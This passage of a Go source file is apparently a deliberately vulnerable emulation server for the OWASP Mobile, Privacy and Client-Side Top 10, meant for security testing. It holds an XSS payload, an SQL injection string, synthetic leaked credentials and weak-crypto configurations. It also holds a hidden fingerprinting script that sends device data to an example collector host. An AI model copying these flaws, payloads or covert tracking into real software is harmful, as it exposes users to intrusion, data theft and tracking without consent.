package vuln

import (
	"fmt"
	"math/rand"
	"net/http"
	"strings"
)

// ---------------------------------------------------------------------------
// Routing — OWASP Mobile Top 10, Privacy Top 10, Client-Side Top 10
// ---------------------------------------------------------------------------

// MobileShouldHandle returns true if the path belongs to a mobile, privacy, or
// client-side vulnerability emulation endpoint.
func (h *Handler) MobileShouldHandle(path string) bool {
	return strings.HasPrefix(path, "/vuln/mobile/") ||
		strings.HasPrefix(path, "/vuln/privacy-risks/") ||
		strings.HasPrefix(path, "/vuln/client-side/")
}

// ServeMobile dispatches the request to the appropriate mobile, privacy, or
// client-side vulnerability handler. Returns the HTTP status code written.
func (h *Handler) ServeMobile(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path

	switch {
	// ---- Mobile Top 10 index ----
	case path == "/vuln/mobile/" || path == "/vuln/mobile":
		return h.serveMobileIndex(w, r)

	// ---- Mobile Top 10 endpoints ----
	case strings.HasPrefix(path, "/vuln/mobile/improper-credential"):
		return h.serveMobileImproperCredential(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/inadequate-supply-chain"):
		return h.serveMobileSupplyChain(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/insecure-auth"):
		return h.serveMobileInsecureAuth(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/insufficient-validation"):
		return h.serveMobileInsufficientValidation(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/insecure-communication"):
		return h.serveMobileInsecureCommunication(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/inadequate-privacy"):
		return h.serveMobileInadequatePrivacy(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/insufficient-binary"):
		return h.serveMobileInsufficientBinary(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/security-misconfig"):
		return h.serveMobileSecurityMisconfig(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/insecure-storage"):
		return h.serveMobileInsecureStorage(w, r)
	case strings.HasPrefix(path, "/vuln/mobile/insufficient-crypto"):
		return h.serveMobileInsufficientCrypto(w, r)

	// ---- Privacy Top 10 index ----
	case path == "/vuln/privacy-risks/" || path == "/vuln/privacy-risks":
		return h.servePrivacyIndex(w, r)

	// ---- Privacy Top 10 endpoints ----
	case strings.HasPrefix(path, "/vuln/privacy-risks/web-tracking"):
		return h.servePrivacyWebTracking(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/data-collection"):
		return h.servePrivacyDataCollection(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/inadequate-breach"):
		return h.servePrivacyInadequateBreach(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/insufficient-deletion"):
		return h.servePrivacyInsufficientDeletion(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/non-transparent"):
		return h.servePrivacyNonTransparent(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/insufficient-consent"):
		return h.servePrivacyInsufficientConsent(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/collection-not-required"):
		return h.servePrivacyCollectionNotRequired(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/sharing-without-consent"):
		return h.servePrivacySharingWithoutConsent(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/outdated-personal-data"):
		return h.servePrivacyOutdatedData(w, r)
	case strings.HasPrefix(path, "/vuln/privacy-risks/insufficient-session-expiry"):
		return h.servePrivacySessionExpiry(w, r)

	// ---- Client-Side Top 10 index ----
	case path == "/vuln/client-side/" || path == "/vuln/client-side":
		return h.serveClientSideIndex(w, r)

	// ---- Client-Side Top 10 endpoints ----
	case strings.HasPrefix(path, "/vuln/client-side/dom-xss"):
		return h.serveClientDOMXSS(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/prototype-pollution"):
		return h.serveClientPrototypePollution(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/sensitive-data-exposure"):
		return h.serveClientSensitiveData(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/csp-bypass"):
		return h.serveClientCSPBypass(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/postmessage"):
		return h.serveClientPostMessage(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/dependency-vuln"):
		return h.serveClientDependencyVuln(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/cors-misconfig"):
		return h.serveClientCORSMisconfig(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/insecure-storage"):
		return h.serveClientInsecureStorage(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/clickjacking"):
		return h.serveClientClickjacking(w, r)
	case strings.HasPrefix(path, "/vuln/client-side/open-redirect"):
		return h.serveClientOpenRedirect(w, r)
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusNotFound)
	fmt.Fprint(w, h.wrapHTML("Not Found", "<p>Unknown mobile/privacy/client-side vulnerability demo path.</p>"))
	return http.StatusNotFound
}

// ---------------------------------------------------------------------------
// Index pages
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Mobile Top 10 (2024)</h2>
<p>Mobile-specific vulnerability emulations. Endpoints return JSON API responses with mobile headers.</p>
<ul>
  <li><a href="/vuln/mobile/improper-credential">M1 - Improper Credential Usage</a> — credentials in plaintext, tokens in SharedPreferences</li>
  <li><a href="/vuln/mobile/inadequate-supply-chain">M2 - Inadequate Supply Chain Security</a> — suspicious third-party SDKs with excessive permissions</li>
  <li><a href="/vuln/mobile/insecure-auth">M3 - Insecure Authentication/Authorization</a> — empty biometric tokens, session fixation</li>
  <li><a href="/vuln/mobile/insufficient-validation">M4 - Insufficient Input/Output Validation</a> — no server-side validation</li>
  <li><a href="/vuln/mobile/insecure-communication">M5 - Insecure Communication</a> — no HSTS, HTTP downgrade, certificate pinning bypass</li>
  <li><a href="/vuln/mobile/inadequate-privacy">M6 - Inadequate Privacy Controls</a> — device fingerprint, location history, contacts leak</li>
  <li><a href="/vuln/mobile/insufficient-binary">M7 - Insufficient Binary Protections</a> — no obfuscation, debug symbols present</li>
  <li><a href="/vuln/mobile/security-misconfig">M8 - Security Misconfiguration</a> — debug endpoints, USB debugging enabled</li>
  <li><a href="/vuln/mobile/insecure-storage">M9 - Insecure Data Storage</a> — PII in cleartext SQLite</li>
  <li><a href="/vuln/mobile/insufficient-crypto">M10 - Insufficient Cryptography</a> — MD5 password hashing, ECB mode encryption</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Mobile Top 10 (2024)", body))
	return http.StatusOK
}

func (h *Handler) servePrivacyIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Privacy Risks Top 10 (2021)</h2>
<p>Privacy-related vulnerability emulations. Endpoints return full HTML pages with realistic tracking, consent forms, and privacy policies.</p>
<ul>
  <li><a href="/vuln/privacy-risks/web-tracking">P1 - Web Application Vulnerabilities &amp; Tracking</a> — tracking pixels, fingerprinting, cross-domain cookies</li>
  <li><a href="/vuln/privacy-risks/data-collection">P2 - Excessive Data Collection</a> — forms collecting SSN, mother's maiden name, etc.</li>
  <li><a href="/vuln/privacy-risks/inadequate-breach">P3 - Inadequate Breach Response</a> — delayed/incomplete disclosure notification</li>
  <li><a href="/vuln/privacy-risks/insufficient-deletion">P4 - Insufficient Data Deletion</a> — soft delete that does not actually remove data</li>
  <li><a href="/vuln/privacy-risks/non-transparent">P5 - Non-transparent Policies</a> — deceptive language, buried opt-outs</li>
  <li><a href="/vuln/privacy-risks/insufficient-consent">P6 - Insufficient Consent Management</a> — pre-checked boxes, dark patterns</li>
  <li><a href="/vuln/privacy-risks/collection-not-required">P7 - Collection of Data Not Required</a> — geolocation/device ID for a weather app</li>
  <li><a href="/vuln/privacy-risks/sharing-without-consent">P8 - Sharing Data with Third Parties Without Consent</a> — 50+ data partners</li>
  <li><a href="/vuln/privacy-risks/outdated-personal-data">P9 - Outdated Personal Data</a> — stale profile with no update mechanism</li>
  <li><a href="/vuln/privacy-risks/insufficient-session-expiry">P10 - Insufficient Session Expiry</a> — 365-day tokens, no logout</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Privacy Risks Top 10 (2021)", body))
	return http.StatusOK
}

func (h *Handler) serveClientSideIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Client-Side Security Top 10 (2024)</h2>
<p>Client-side vulnerability emulations. Endpoints return HTML pages with realistic vulnerable JavaScript (all data is synthetic).</p>
<ul>
  <li><a href="/vuln/client-side/dom-xss">C1 - DOM-Based XSS</a> — innerHTML from URL hash, document.write from query params</li>
  <li><a href="/vuln/client-side/prototype-pollution">C2 - Prototype Pollution</a> — vulnerable deep merge, JSON.parse of user input</li>
  <li><a href="/vuln/client-side/sensitive-data-exposure">C3 - Sensitive Data Exposure</a> — API keys in JS source, tokens in localStorage</li>
  <li><a href="/vuln/client-side/csp-bypass">C4 - CSP Bypass</a> — unsafe-inline, unsafe-eval, nonce reuse</li>
  <li><a href="/vuln/client-side/postmessage">C5 - PostMessage Vulnerabilities</a> — accepting messages from any origin</li>
  <li><a href="/vuln/client-side/dependency-vuln">C6 - Vulnerable Dependencies</a> — old jQuery 1.x, lodash with prototype pollution</li>
  <li><a href="/vuln/client-side/cors-misconfig">C7 - CORS Misconfiguration</a> — reflected origin, credentials: true</li>
  <li><a href="/vuln/client-side/insecure-storage">C8 - Insecure Client-Side Storage</a> — tokens in localStorage, PII in sessionStorage</li>
  <li><a href="/vuln/client-side/clickjacking">C9 - Clickjacking</a> — no X-Frame-Options, no frame-ancestors</li>
  <li><a href="/vuln/client-side/open-redirect">C10 - Open Redirect</a> — no validation, javascript: scheme allowed</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Client-Side Security Top 10 (2024)", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// Mobile helpers
// ---------------------------------------------------------------------------

func (h *Handler) mobileHeaders(w http.ResponseWriter, rng *rand.Rand) {
	w.Header().Set("X-App-Version", fmt.Sprintf("%d.%d.%d", rng.Intn(5)+1, rng.Intn(20), rng.Intn(100)))
	w.Header().Set("X-Device-ID", fmt.Sprintf("dev_%s", h.randomHex(rng, 16)))
	w.Header().Set("X-Platform", []string{"iOS", "Android", "HarmonyOS"}[rng.Intn(3)])
	w.Header().Set("X-API-Gateway", "mobile-edge-"+h.randomHex(rng, 4))
	w.Header().Set("Content-Type", "application/json")
}

func (h *Handler) mobileJSON(w http.ResponseWriter, rng *rand.Rand, status int, body string) int {
	h.mobileHeaders(w, rng)
	w.WriteHeader(status)
	fmt.Fprint(w, body)
	return status
}

// ---------------------------------------------------------------------------
// M1: Improper Credential Usage
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileImproperCredential(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-improper-credential")

	resp := toJSON(map[string]interface{}{
		"status": "authenticated",
		"user": map[string]interface{}{
			"id":       rng.Intn(90000) + 10000,
			"username": h.firstNames[rng.Intn(len(h.firstNames))],
			"email":    h.randomEmail(rng),
		},
		"credentials": map[string]interface{}{
			"api_key":       fmt.Sprintf("ak_%s", h.randomHex(rng, 32)),
			"api_secret":    fmt.Sprintf("sk_%s", h.randomHex(rng, 48)),
			"refresh_token": fmt.Sprintf("rt_%s", h.randomHex(rng, 64)),
			"password_hash": fmt.Sprintf("$plaintext$%s%d", h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(999)),
		},
		"storage": map[string]interface{}{
			"location":    "SharedPreferences",
			"file":        "/data/data/com.acme.app/shared_prefs/auth.xml",
			"encrypted":   false,
			"world_readable": true,
		},
		"_debug": map[string]interface{}{
			"raw_password":   fmt.Sprintf("%s%d!", h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(9999)),
			"oauth_state":    h.randomHex(rng, 16),
			"pin_code":       fmt.Sprintf("%04d", rng.Intn(10000)),
			"biometric_key":  h.randomHex(rng, 32),
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M2: Inadequate Supply Chain Security
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileSupplyChain(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-inadequate-supply-chain")

	sdks := []map[string]interface{}{
		{"name": "AdTrackPro SDK", "version": "3.2.1", "permissions": []string{"CAMERA", "MICROPHONE", "READ_CONTACTS", "ACCESS_FINE_LOCATION", "READ_CALL_LOG"}, "verified": false, "source": "mirror.untrusted-cdn.com"},
		{"name": "AnalyticsPlus", "version": "1.0.0-beta", "permissions": []string{"READ_SMS", "SEND_SMS", "READ_PHONE_STATE", "INTERNET", "RECEIVE_BOOT_COMPLETED"}, "verified": false, "source": "github.com/unknown-fork/analyticsplus"},
		{"name": "CrashReporter", "version": "0.9.8", "permissions": []string{"READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE", "GET_ACCOUNTS", "ACCESS_WIFI_STATE"}, "verified": false, "source": "jcenter.bintray.com"},
		{"name": "PushHelper", "version": "2.4.0", "permissions": []string{"RECEIVE_SMS", "WAKE_LOCK", "SYSTEM_ALERT_WINDOW", "INSTALL_PACKAGES"}, "verified": false, "source": "s3.amazonaws.com/leaked-sdks"},
		{"name": "UIKit-Unofficial", "version": "5.1.3-patched", "permissions": []string{"CAMERA", "RECORD_AUDIO", "READ_CALENDAR"}, "verified": false, "source": "npm-mirror.sketchy.io"},
	}

	resp := toJSON(map[string]interface{}{
		"app_id":      fmt.Sprintf("com.acme.app.%s", h.randomHex(rng, 4)),
		"build":       rng.Intn(5000) + 1000,
		"manifest_analysis": map[string]interface{}{
			"total_permissions": 47,
			"dangerous_permissions": 23,
			"sdks_loaded":   len(sdks),
			"unverified":    len(sdks),
			"signature_check": "disabled",
		},
		"third_party_sdks": sdks,
		"warnings": []string{
			"SDK 'AdTrackPro' requests CAMERA and MICROPHONE without declared feature usage",
			"SDK 'AnalyticsPlus' loaded from unverified fork, not from official repository",
			"SDK 'PushHelper' requests INSTALL_PACKAGES - potential sideloading risk",
			"No SBOM (Software Bill of Materials) found in build artifacts",
			"Code signing certificate expires in 12 days",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M3: Insecure Authentication/Authorization
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileInsecureAuth(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-insecure-auth")

	sessionID := h.randomHex(rng, 32)
	resp := toJSON(map[string]interface{}{
		"auth_result": "success",
		"method":      "biometric",
		"biometric_token": "",
		"biometric_validated": true,
		"session": map[string]interface{}{
			"id":         sessionID,
			"fixed":      true,
			"created":    "2025-01-01T00:00:00Z",
			"expires":    "2099-12-31T23:59:59Z",
			"rotated":    false,
			"ip_binding": false,
		},
		"user": map[string]interface{}{
			"id":   rng.Intn(90000) + 10000,
			"role": "admin",
			"name": h.randomName(rng),
		},
		"_vulnerabilities": []string{
			"Empty biometric token accepted as valid authentication",
			"Session ID is fixed and never rotated",
			"Session expires in 75 years - effectively never",
			"No IP or device binding on session",
			"No rate limiting on authentication attempts",
			"Authorization check bypassed for role=admin",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M4: Insufficient Input/Output Validation
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileInsufficientValidation(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-insufficient-validation")

	userInput := r.URL.Query().Get("input")
	if userInput == "" {
		userInput = "<script>alert('xss')</script>"
	}

	resp := toJSON(map[string]interface{}{
		"status":  "accepted",
		"message": "Input processed without validation",
		"request": map[string]interface{}{
			"raw_input":         userInput,
			"sanitized":         false,
			"server_validated":  false,
			"client_only_check": true,
			"length_check":     false,
			"type_check":       false,
		},
		"processed_data": map[string]interface{}{
			"name":    userInput,
			"email":   "anything-goes@" + userInput,
			"amount":  "-99999.99",
			"quantity": "-1",
			"comment": "'; DROP TABLE users; --",
		},
		"_warnings": []string{
			"No server-side input validation performed",
			"Client-side validation can be bypassed",
			"Negative values accepted for amount and quantity",
			"SQL injection payload stored without sanitization",
			"No output encoding applied",
			"Content-Type not validated on file uploads",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M5: Insecure Communication
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileInsecureCommunication(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-insecure-communication")
	// Intentionally omit HSTS and security transport headers
	w.Header().Del("Strict-Transport-Security")

	resp := toJSON(map[string]interface{}{
		"api_endpoint": "http://api.acme-internal.com/v2/users",
		"protocol":     "HTTP/1.1",
		"tls":          false,
		"certificate_pinning": map[string]interface{}{
			"enabled":          false,
			"pins":             []string{},
			"bypass_on_debug":  true,
			"trust_user_certs": true,
		},
		"transport_security": map[string]interface{}{
			"hsts_enabled":        false,
			"allow_http_fallback": true,
			"min_tls_version":     "TLSv1.0",
			"weak_ciphers":        []string{"RC4-SHA", "DES-CBC3-SHA", "AES128-SHA"},
			"certificate_validation": false,
		},
		"intercepted_data": map[string]interface{}{
			"auth_token": fmt.Sprintf("Bearer %s", h.randomHex(rng, 48)),
			"user_email": h.randomEmail(rng),
			"credit_card": fmt.Sprintf("%04d-%04d-%04d-%04d", rng.Intn(10000), rng.Intn(10000), rng.Intn(10000), rng.Intn(10000)),
		},
		"_warnings": []string{
			"No HSTS header present - HTTP downgrade attack possible",
			"Certificate pinning disabled in production build",
			"User-installed certificates trusted - MITM via proxy",
			"TLSv1.0 allowed - vulnerable to POODLE/BEAST",
			"Sensitive data transmitted over unencrypted channel",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M6: Inadequate Privacy Controls
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileInadequatePrivacy(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-inadequate-privacy")

	contacts := []map[string]interface{}{}
	for i := 0; i < 5; i++ {
		contacts = append(contacts, map[string]interface{}{
			"name":  h.randomName(rng),
			"phone": fmt.Sprintf("+1-%03d-%03d-%04d", rng.Intn(900)+100, rng.Intn(900)+100, rng.Intn(10000)),
			"email": h.randomEmail(rng),
		})
	}

	locations := []map[string]interface{}{}
	for i := 0; i < 8; i++ {
		locations = append(locations, map[string]interface{}{
			"lat":       fmt.Sprintf("%.6f", 37.0+rng.Float64()*5),
			"lng":       fmt.Sprintf("%.6f", -122.0+rng.Float64()*5),
			"timestamp": fmt.Sprintf("2025-12-%02dT%02d:%02d:00Z", rng.Intn(28)+1, rng.Intn(24), rng.Intn(60)),
			"accuracy":  fmt.Sprintf("%.1f", rng.Float64()*50+1),
		})
	}

	resp := toJSON(map[string]interface{}{
		"device_fingerprint": map[string]interface{}{
			"device_id":    fmt.Sprintf("IMEI:%s", h.randomHex(rng, 15)),
			"advertising_id": fmt.Sprintf("%s-%s-%s-%s", h.randomHex(rng, 8), h.randomHex(rng, 4), h.randomHex(rng, 4), h.randomHex(rng, 12)),
			"mac_address":  fmt.Sprintf("%s:%s:%s:%s:%s:%s", h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2)),
			"serial":       h.randomHex(rng, 16),
			"android_id":   h.randomHex(rng, 16),
		},
		"location_history": locations,
		"contacts_accessed": contacts,
		"data_sharing": map[string]interface{}{
			"sent_to_analytics":  true,
			"sent_to_ads":        true,
			"user_consent":       false,
			"opt_out_available":  false,
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M7: Insufficient Binary Protections
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileInsufficientBinary(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-insufficient-binary")

	resp := toJSON(map[string]interface{}{
		"binary_analysis": map[string]interface{}{
			"package":        "com.acme.mobileapp",
			"format":         "APK (Android)",
			"size_bytes":     rng.Intn(50000000) + 10000000,
			"min_sdk":        21,
			"target_sdk":     34,
		},
		"protections": map[string]interface{}{
			"code_obfuscation":   false,
			"proguard_enabled":   false,
			"r8_enabled":         false,
			"root_detection":     false,
			"emulator_detection": false,
			"debugger_detection": false,
			"tamper_detection":   false,
			"ssl_pinning":        false,
		},
		"debug_info": map[string]interface{}{
			"debuggable":           true,
			"debug_symbols":        true,
			"source_maps_included": true,
			"logging_enabled":      true,
			"test_keys_present":    true,
		},
		"exposed_strings": []string{
			fmt.Sprintf("API_KEY=%s", h.randomHex(rng, 32)),
			fmt.Sprintf("DB_PASSWORD=%s", h.lastNames[rng.Intn(len(h.lastNames))]+fmt.Sprintf("%d", rng.Intn(9999))),
			"FIREBASE_URL=https://acme-prod.firebaseio.com",
			fmt.Sprintf("AWS_SECRET=%s", h.randomHex(rng, 40)),
			"DEBUG_ENDPOINT=https://debug.acme-internal.com/admin",
		},
		"ipa_analysis": map[string]interface{}{
			"bitcode_stripped":     false,
			"pie_enabled":         false,
			"arc_enabled":         true,
			"stack_canaries":      false,
			"encryption_info":     "none",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M8: Security Misconfiguration
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileSecurityMisconfig(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-security-misconfig")

	resp := toJSON(map[string]interface{}{
		"app_config": map[string]interface{}{
			"debug_mode":          true,
			"allow_usb_debugging": true,
			"allow_backup":        true,
			"exported_activities": []string{"LoginActivity", "DeepLinkActivity", "AdminPanelActivity", "DebugActivity"},
			"exported_providers":  []string{"UserContentProvider", "FileProvider", "ConfigProvider"},
			"exported_receivers":  []string{"PushReceiver", "BootReceiver", "SMSReceiver"},
		},
		"debug_endpoints": map[string]interface{}{
			"/api/debug/config":    "returns full app configuration",
			"/api/debug/users":     "lists all user records",
			"/api/debug/logs":      "returns application logs with PII",
			"/api/debug/sql":       "executes raw SQL queries",
			"/api/debug/env":       "returns environment variables",
		},
		"network_security_config": map[string]interface{}{
			"cleartext_permitted":     true,
			"user_certs_trusted":      true,
			"certificate_transparency": false,
			"domain_whitelist":        []string{"*"},
		},
		"webview_config": map[string]interface{}{
			"javascript_enabled":     true,
			"file_access":            true,
			"universal_access":       true,
			"allow_content_access":   true,
			"dom_storage":            true,
			"mixed_content_mode":     "MIXED_CONTENT_ALWAYS_ALLOW",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M9: Insecure Data Storage
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileInsecureStorage(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-insecure-storage")

	rows := []map[string]interface{}{}
	for i := 0; i < 6; i++ {
		rows = append(rows, map[string]interface{}{
			"id":            rng.Intn(90000) + 10000,
			"full_name":     h.randomName(rng),
			"email":         h.randomEmail(rng),
			"phone":         fmt.Sprintf("+1-%03d-%03d-%04d", rng.Intn(900)+100, rng.Intn(900)+100, rng.Intn(10000)),
			"ssn":           fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000),
			"password":      fmt.Sprintf("%s%d!", h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(9999)),
			"credit_card":   fmt.Sprintf("%04d%04d%04d%04d", rng.Intn(10000), rng.Intn(10000), rng.Intn(10000), rng.Intn(10000)),
			"date_of_birth": fmt.Sprintf("19%02d-%02d-%02d", rng.Intn(70)+30, rng.Intn(12)+1, rng.Intn(28)+1),
		})
	}

	resp := toJSON(map[string]interface{}{
		"storage_type": "SQLite",
		"database_path": "/data/data/com.acme.app/databases/userdata.db",
		"encrypted":     false,
		"permissions":   "MODE_WORLD_READABLE",
		"tables": map[string]interface{}{
			"users": map[string]interface{}{
				"row_count": len(rows),
				"columns":   []string{"id", "full_name", "email", "phone", "ssn", "password", "credit_card", "date_of_birth"},
			},
		},
		"cleartext_records": rows,
		"additional_files": []string{
			"/data/data/com.acme.app/shared_prefs/auth_tokens.xml",
			"/data/data/com.acme.app/shared_prefs/user_prefs.xml",
			"/data/data/com.acme.app/cache/http_cache/",
			"/sdcard/Android/data/com.acme.app/logs/debug.log",
			"/sdcard/Android/data/com.acme.app/exports/users.csv",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ---------------------------------------------------------------------------
// M10: Insufficient Cryptography
// ---------------------------------------------------------------------------

func (h *Handler) serveMobileInsufficientCrypto(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "mobile-insufficient-crypto")

	resp := toJSON(map[string]interface{}{
		"password_storage": map[string]interface{}{
			"algorithm":   "MD5",
			"iterations":  1,
			"salt":        false,
			"sample_hash": fmt.Sprintf("%s", h.randomHex(rng, 32)),
			"plaintext":   fmt.Sprintf("%s%d", h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(9999)),
		},
		"encryption": map[string]interface{}{
			"algorithm":   "AES",
			"mode":        "ECB",
			"padding":     "PKCS5Padding",
			"key_size":    128,
			"iv":          "0000000000000000",
			"key_storage": "hardcoded_in_source",
			"key_value":   h.randomHex(rng, 32),
		},
		"token_generation": map[string]interface{}{
			"method":      "Math.random()",
			"entropy":     "insufficient",
			"predictable": true,
			"sample":      fmt.Sprintf("tok_%d", rng.Intn(999999)),
		},
		"certificate_validation": map[string]interface{}{
			"hostname_verification": false,
			"cert_chain_validation": false,
			"self_signed_accepted":  true,
			"expired_accepted":      true,
		},
		"_findings": []string{
			"MD5 used for password hashing - collision attacks trivial",
			"ECB mode preserves plaintext patterns in ciphertext",
			"Static IV (all zeros) - identical plaintexts produce identical ciphertexts",
			"Encryption key hardcoded in application source code",
			"Math.random() used for security tokens - not cryptographically secure",
			"No certificate validation - MITM attacks possible",
		},
	})
	return h.mobileJSON(w, rng, http.StatusOK, resp)
}

// ===========================================================================
// Privacy Top 10 Endpoints
// ===========================================================================

// ---------------------------------------------------------------------------
// P1: Web Application Vulnerabilities / Tracking
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyWebTracking(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-web-tracking")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	// Build tracking pixels
	var pixels strings.Builder
	trackers := []string{
		"analytics.doubleclick.example", "pixel.facebook.example", "bat.bing.example",
		"tags.tiqcdn.example", "tr.snapchat.example", "ct.pinterest.example",
		"s.yimg.example", "px.ads.linkedin.example", "www.googletagmanager.example",
		"connect.facebook.example", "t.co.example", "analytics.tiktok.example",
		"sc-static.example", "cdn.mxpnl.example", "cdn.segment.example",
		"rum-static.pingdom.example",
	}
	for _, t := range trackers {
		pixels.WriteString(fmt.Sprintf(`<img src="https://%s/pixel?uid=%s&sid=%s&t=%d" width="1" height="1" style="display:none" />%s`,
			t, h.randomHex(rng, 12), h.randomHex(rng, 8), rng.Int63(), "\n"))
	}

	// Build fingerprinting script
	fpScript := fmt.Sprintf(`<script>
// Canvas fingerprinting
var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
ctx.textBaseline = 'top';
ctx.font = '14px Arial';
ctx.fillText('fingerprint_%s', 2, 2);
var fp = canvas.toDataURL();

// WebGL fingerprinting
var gl = document.createElement('canvas').getContext('webgl');
var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

// AudioContext fingerprinting
var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
var oscillator = audioCtx.createOscillator();
var analyser = audioCtx.createAnalyser();
oscillator.connect(analyser);

// Battery API
navigator.getBattery().then(function(battery) {
    var data = {level: battery.level, charging: battery.charging};
    fetch('/collect?type=battery&data=' + JSON.stringify(data));
});

// Collect everything
var profile = {
    screen: screen.width + 'x' + screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    languages: navigator.languages,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    canvas_fp: fp.substring(0, 64),
    webgl_vendor: vendor,
    webgl_renderer: renderer,
    touch: navigator.maxTouchPoints,
    memory: navigator.deviceMemory,
    cores: navigator.hardwareConcurrency
};
document.cookie = '_track_uid=%s; expires=Fri, 31 Dec 2099 23:59:59 GMT; path=/; SameSite=None; Secure';
document.cookie = '_track_sid=%s; expires=Fri, 31 Dec 2099 23:59:59 GMT; path=/; domain=.example.com';
fetch('https://collector.analytics.example/ingest', {method:'POST', body: JSON.stringify(profile)});
